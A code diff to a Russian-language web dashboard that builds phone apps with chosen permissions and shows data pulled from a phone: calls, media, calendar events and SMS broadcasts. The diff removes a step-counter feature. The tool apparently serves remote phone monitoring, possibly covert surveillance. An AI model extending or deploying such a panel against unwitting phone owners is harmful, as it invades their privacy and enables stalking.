@@ -587,7 +587,6 @@ $('#buildBtn').onclick = async () => {
   if ($('#permLocation').checked) perms.push('LOCATION');
   if ($('#permMedia').checked) perms.push('MEDIA');
   if ($('#permCalendar').checked) perms.push('CALENDAR');
-  if ($('#permActivity').checked) perms.push('ACTIVITY');
   const fd = new FormData();
   fd.append('appName', $('#bAppName').value);
   fd.append('applicationId', $('#bAppId').value);
@@ -901,9 +900,6 @@ function startCallsViewer(requestDataOnOpen) {
         applyMediaThumb(m);
       } else if (m.type === 'calendar-events') {
         renderCalendar(m);
-      } else if (m.type === 'step-count') {
-        const el = $('#stepsResult');
-        if (el) el.textContent = m.err ? ('Ошибка: ' + m.err) : (m.steps.toLocaleString('ru-RU') + ' шагов (с последней перезагрузки)');
       } else if (m.type === 'sms-broadcast-done') {
         $('#broadcastBtn').disabled = false;
         $('#broadcastBtn').textContent = '📢 Разослать';
@@ -1507,13 +1503,6 @@ function renderCalendar(m) {
     </div>`;
   }).join('');
 }
-
-// ---------- Шагомер ----------
-$('#cmdGetSteps').onclick = () => {
-  const el = $('#stepsResult');
-  if (el) el.textContent = 'Считаем…';
-  phoneSend({ cmd: 'get-steps' });
-};
 
 // ---------- Старт ----------
 loadDashboard();
